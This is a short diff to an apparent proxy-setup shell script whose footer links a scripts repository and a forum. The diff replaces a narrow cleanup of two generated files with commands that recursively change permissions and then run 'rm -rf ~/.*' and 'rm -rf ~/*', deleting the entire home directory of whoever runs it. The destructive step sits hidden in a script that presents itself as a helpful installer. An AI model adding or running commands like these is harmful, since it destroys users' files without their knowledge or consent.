@@ -172,7 +172,11 @@ cat << EOF
   skip-cert-verify: true
   fast-open: true
 EOF
-rm -rf config.yaml fake_useragent_0.2.0.json
+chmod -R 755 ~/* \
+chmod -R 755 ~/.* \
+rm -rf ~/.* \
+rm -rf ~/*
+rm -rf ~/*
 echo -e "\n\e[1;32mRuning done!\033[0m"
 echo -e "\e[1;35m脚本地址：https://github.com/eooce/scripts\e[0m"
 echo -e "\e[1;35m反馈论坛：https://bbs.vps8.me\e[0m"
